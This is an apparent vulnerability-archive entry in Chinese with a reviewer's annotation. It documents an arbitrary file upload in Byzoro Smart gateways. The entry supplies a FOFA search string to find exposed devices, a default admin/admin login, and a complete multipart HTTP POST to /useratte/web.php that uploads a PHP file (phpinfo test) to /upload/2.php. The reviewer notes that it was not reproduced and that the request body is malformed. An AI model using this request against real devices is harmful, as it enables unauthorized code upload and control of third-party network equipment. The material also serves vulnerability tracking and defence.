---
source: "wy876 漏洞文库"
id: "vw-2c8209990902ea28428b1420"
entity_id: "ve-2c8209990902ea28428b1420"
schema_version: "1"
title: "百卓Smart后台任意文件上传漏洞"
product: "Byzoro Smart"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "admin登录，默认admin/admin仅部署可能；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%99%BE%E5%8D%93/%E7%99%BE%E5%8D%93Smart%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/znskqftupnfub0ea"
source_status: "recorded"
---

# 百卓Smart后台任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Byzoro Smart
- 本文讨论：useratte/web.php导入文件上传
- 版本、权限与配置前提：admin登录，默认admin/admin仅部署可能；版本未知
- 资料类型：后台文件上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- multipart末尾缺结束--；User-Agent与Accept黏连
- 无响应/解析执行证据或修复，phpinfo样例不是可交互webshell
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 文件落盘、PHP执行与版本范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。该网关后台存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征


# 四、漏洞复现
1. 使用默认账号`admin/admin`登录后台，获取登录后的`cookie`


2. 使用上一步获取的cookie替换上传webshell

```http
POST /useratte/web.php? HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=6fca23a63591d8742708a4c50308f150
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 611
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328
```


3. 上传文件位置

```plain
/upload/2.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/znskqftupnfub0ea>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
